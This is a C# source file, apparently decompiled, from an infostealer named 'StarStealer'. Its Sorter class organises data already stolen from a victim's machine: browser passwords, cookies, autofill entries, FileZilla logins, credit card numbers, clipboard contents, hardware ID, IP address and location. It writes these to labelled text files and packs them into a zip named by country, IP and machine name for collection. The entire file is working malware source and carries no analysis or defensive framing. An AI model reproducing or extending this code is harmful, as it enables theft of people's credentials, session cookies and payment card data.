using StarStealer.Entities;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;

namespace StarStealer.Utilities
{
	internal class Sorter
	{
		public static void Sort(ref User u)
		{
			string text = Path.Combine(Identifier.StealerFolder, "Browsers");
			try
			{
				if (Directory.Exists(text))
				{
					Directory.Delete(text, recursive: true);
				}
				Directory.CreateDirectory(text);
			}
			catch (Exception item)
			{
				Program.Errors.Add(item);
			}
			try
			{
				using (FileStream stream = new FileStream(Path.Combine(Identifier.StealerFolder, "Information.txt"), FileMode.CreateNew))
				{
					using (StreamWriter streamWriter = new StreamWriter(stream))
					{
						try
						{
							streamWriter.Write("StarStealer by F A T H E R\n" + new string('―', 40) + "\nTime: " + u.Time + "\n" + new string('―', 40) + "\nHwid: " + u.Hwid + "\nUserName: " + u.UserName + "\nMachine Name: " + u.MachineName + "\nWindows Version: " + u.WindowsVersion + "\nScreen Resolution: " + u.ScreenResolution + "\nCPU: " + u.Processor + "\nGPU: " + u.Video + "\nAntiVirus: " + u.AntiVirus + "\n" + new string('―', 40) + "\nIP: " + u.IP + "\nCountry: " + u.Country + "\nCountry Code: " + u.CountryCode + "\nCity: " + u.City + "\nZip: " + u.Zip + "\n" + new string('―', 40) + "\n" + $"Passwords: {u.PasswordsNumber}\n" + $"Cookies: {u.CookiesNumber}\n" + $"Cards: {u.CardsNumber}\n" + $"Files: {u.DesktopArchiveCount}\n" + new string('―', 40) + "\nPhoto: " + (u.WithPhoto ? "+" : "-") + "\nFileZilla: " + (u.FileZilla ? "+" : "-") + "\nTelegram: " + (u.Telegram ? "+" : "-") + "\nSteam: " + (u.Steam ? "+" : "-") + "\nDiscord: " + (u.Discord ? "+" : "-") + "\nBitcoins: " + (u.Bitcoin ? "+" : "-") + "\n" + new string('―', 40) + "\nClipBoard: " + u.ClipBoardText + "\n" + new string('―', 40) + "\n" + u.MacAddress + new string('―', 40) + "\n");
						}
						catch (Exception item2)
						{
							Program.Errors.Add(item2);
						}
					}
				}
			}
			catch
			{
			}
			using (FileStream stream2 = new FileStream(Path.Combine(Identifier.StealerFolder, "UserAgents.txt"), FileMode.CreateNew))
			{
				using (StreamWriter streamWriter2 = new StreamWriter(stream2))
				{
					foreach (string userAgent in u.UserAgents)
					{
						try
						{
							if (userAgent.Contains("rv:"))
							{
								streamWriter2.WriteLine("\n-----Firefox-----\n" + userAgent + "\n------------------");
							}
							else if (userAgent.Contains("OPR"))
							{
								streamWriter2.WriteLine("\n-----Opera------\n" + userAgent + "\n----------------");
							}
							else
							{
								streamWriter2.WriteLine("\n-----Chrome------\n" + userAgent + "\n-----------------");
							}
						}
						catch (Exception item3)
						{
							Program.Errors.Add(item3);
						}
					}
				}
			}
			if (u.PasswordsNumber > 0)
			{
				using (FileStream stream3 = new FileStream(Path.Combine(Identifier.StealerFolder, "PasswordsList.txt"), FileMode.CreateNew))
				{
					List<Password> list = new List<Password>();
					foreach (Browser browser in u.Browsers)
					{
						foreach (Profile profile in browser.Profiles)
						{
							foreach (Password password in profile.Passwords)
							{
								try
								{
									list.Add(new Password
									{
										Browser = browser.Name,
										Login = password.Login,
										Pass = password.Pass,
										Profile = profile.Name,
										URL = password.URL
									});
								}
								catch (Exception item4)
								{
									Program.Errors.Add(item4);
								}
							}
						}
					}
					u.Passwords.AddRange(list);
					using (StreamWriter streamWriter3 = new StreamWriter(stream3))
					{
						foreach (Password password2 in u.Passwords)
						{
							try
							{
								streamWriter3.WriteLine("URL:      | " + password2.URL + "\nLogin:    | " + password2.Login + "\nPassword: | " + password2.Pass + "\nBrowser:  | " + password2.Browser + "\nProfile:  | " + password2.Profile + "\n" + new string('―', 40));
							}
							catch (Exception item5)
							{
								Program.Errors.Add(item5);
							}
						}
					}
				}
			}
			if (u.CookiesNumber > 0)
			{
				string text2 = Path.Combine(text, "Cookies");
				Directory.CreateDirectory(text2);
				foreach (Browser browser2 in u.Browsers)
				{
					foreach (Profile profile2 in browser2.Profiles)
					{
						using (FileStream stream4 = new FileStream(Path.Combine(text2, browser2.Name + " - " + profile2.Name + ".txt"), FileMode.CreateNew))
						{
							using (StreamWriter streamWriter4 = new StreamWriter(stream4))
							{
								foreach (Cookie cooky in profile2.Cookies)
								{
									try
									{
										u.Cookies.Add(cooky);
										string empty = string.Empty;
										empty = ((!cooky.Host.StartsWith(".")) ? "FALSE" : "TRUE");
										if (!browser2.Name.Contains("Mozilla"))
										{
											try
											{
												DateTime d = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddMilliseconds(double.Parse(cooky.Expiry) / 1000.0);
												double num = Math.Round((d - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds);
												streamWriter4.WriteLine(string.Format("{0}\t{1}\t/\t{2}\t{3}\t{4}\t{5}", cooky.Host, empty, Convert.ToBoolean(Convert.ToInt32(cooky.IsSecure)) ? "TRUE" : "FALSE", num, cooky.Name, cooky.Value));
											}
											catch
											{
												streamWriter4.WriteLine(cooky.Host + "\t" + empty + "\t/\t" + (Convert.ToBoolean(Convert.ToInt32(cooky.IsSecure)) ? "TRUE" : "FALSE") + "\t" + cooky.Expiry + "\t" + cooky.Name + "\t" + cooky.Value);
											}
										}
										else
										{
											try
											{
												streamWriter4.WriteLine(cooky.Host + "\t" + empty + "\t/\t" + (Convert.ToBoolean(Convert.ToInt32(cooky.IsSecure)) ? "TRUE" : "FALSE") + "\t" + cooky.Expiry + "\t" + cooky.Name + "\t" + cooky.Value);
											}
											catch (Exception item6)
											{
												Program.Errors.Add(item6);
											}
										}
									}
									catch (Exception item7)
									{
										Program.Errors.Add(item7);
									}
								}
							}
						}
					}
				}
			}
			if (u.Forms > 0)
			{
				string text3 = Path.Combine(Identifier.StealerFolder, "Browsers", "AutoFill");
				try
				{
					Directory.CreateDirectory(text3);
				}
				catch (Exception item8)
				{
					Program.Errors.Add(item8);
				}
				foreach (Browser browser3 in u.Browsers)
				{
					foreach (Profile profile3 in browser3.Profiles)
					{
						using (FileStream stream5 = new FileStream(Path.Combine(text3, browser3.Name + " - " + profile3.Name + ".txt"), FileMode.CreateNew))
						{
							using (StreamWriter streamWriter5 = new StreamWriter(stream5))
							{
								try
								{
									foreach (AutoFill autofill in profile3.Autofills)
									{
										try
										{
											streamWriter5.WriteLine("Field:     | " + autofill.Name + "\nValue:     | " + autofill.Value + "\nTimesUsed: | " + autofill.TimesUsed + "\n" + new string('―', 40));
										}
										catch (Exception item9)
										{
											Program.Errors.Add(item9);
										}
									}
								}
								catch (Exception item10)
								{
									Program.Errors.Add(item10);
								}
							}
						}
					}
				}
			}
			if (u.FileZilla)
			{
				using (FileStream stream6 = new FileStream(Path.Combine(Identifier.StealerFolder, "FileZilla.txt"), FileMode.CreateNew))
				{
					using (StreamWriter streamWriter6 = new StreamWriter(stream6))
					{
						foreach (FileZilla fileZillaDatum in u.FileZillaData)
						{
							try
							{
								streamWriter6.WriteLine("IP:       | " + fileZillaDatum.IP + "\nLogin:    | " + fileZillaDatum.Login + "\nPassword: | " + fileZillaDatum.Pass + "\n" + new string('―', 40));
							}
							catch (Exception item11)
							{
								Program.Errors.Add(item11);
							}
						}
					}
				}
			}
			if (u.CardsNumber > 0)
			{
				using (FileStream stream7 = new FileStream(Path.Combine(Identifier.StealerFolder, "CreditCards.txt"), FileMode.CreateNew))
				{
					List<CC> list2 = new List<CC>();
					foreach (Browser browser4 in u.Browsers)
					{
						foreach (Profile profile4 in browser4.Profiles)
						{
							foreach (CC card in profile4.Cards)
							{
								try
								{
									list2.Add(new CC
									{
										HoldersName = card.HoldersName,
										Expire = card.Expire,
										Number = card.Number
									});
								}
								catch (Exception item12)
								{
									Program.Errors.Add(item12);
								}
							}
						}
					}
					using (StreamWriter streamWriter7 = new StreamWriter(stream7))
					{
						foreach (CC item15 in list2)
						{
							try
							{
								streamWriter7.WriteLine("Card:      | " + item15.Number + "\nExpiry:    | " + item15.Expire + "\nHolder: | " + item15.HoldersName + "\n" + new string('―', 40));
							}
							catch (Exception item13)
							{
								Program.Errors.Add(item13);
							}
						}
					}
				}
			}
			if (Program.Errors.Count > 0)
			{
				using (FileStream stream8 = new FileStream(Path.Combine(Identifier.StealerFolder, "errors.txt"), FileMode.Create))
				{
					using (StreamWriter streamWriter8 = new StreamWriter(stream8))
					{
						foreach (Exception error in Program.Errors)
						{
							try
							{
								streamWriter8.WriteLine($"{error.Message}\n{error.Source}\n{error.HResult}\n{error.InnerException}\n{error.TargetSite}\n{error.StackTrace}\n{error.TargetSite}");
							}
							catch
							{
							}
						}
					}
				}
			}
			Identifier.StealerZip = Path.Combine(Identifier.LocalAppData, "[" + u.CountryCode + "]" + u.IP + "-" + u.MachineName + ".zip");
			try
			{
				if (File.Exists(Identifier.StealerZip))
				{
					File.Delete(Identifier.StealerZip);
				}
				ZipFile.CreateFromDirectory(Identifier.StealerFolder, Identifier.StealerZip, CompressionLevel.Optimal, includeBaseDirectory: false);
				Directory.Delete(Identifier.StealerFolder, recursive: true);
			}
			catch (Exception item14)
			{
				Program.Errors.Add(item14);
			}
		}
	}
}
